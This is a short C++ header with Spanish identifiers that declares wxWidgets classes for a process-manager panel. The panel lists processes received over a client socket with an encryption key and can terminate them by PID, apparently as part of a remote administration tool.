#pragma once

#ifndef _PROC_MANAGER
#define _PROC_MANAGER
#include "headers.hpp"

class ListCtrlManager2 : public wxListCtrl {
	public:

		ListCtrlManager2(wxWindow* parent, const wxWindowID id,
			const wxPoint& pos, const wxSize& size, long style, ByteArray c_key)
			: wxListCtrl(parent, id, pos, size, style), enc_key(c_key) {}

		SOCKET sckCliente = INVALID_SOCKET;

		void AgregarData(std::string strBuffer, std::string _strPID);
	private:
		ByteArray enc_key;
		void OnRefrescar(wxCommandEvent& event);
		void OnTerminarPID(wxCommandEvent& event);


		void ShowContextMenu(const wxPoint& pos, bool isEmpty);
		void OnContextMenu(wxContextMenuEvent& event);


		wxDECLARE_EVENT_TABLE();
};


class panelProcessManager : public wxFrame {
	public:
		panelProcessManager(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key);

		void CrearListview();

		ListCtrlManager2* listManager = nullptr;
		
	private:
		ByteArray enc_key;
		SOCKET sckCliente = INVALID_SOCKET;
};

#endif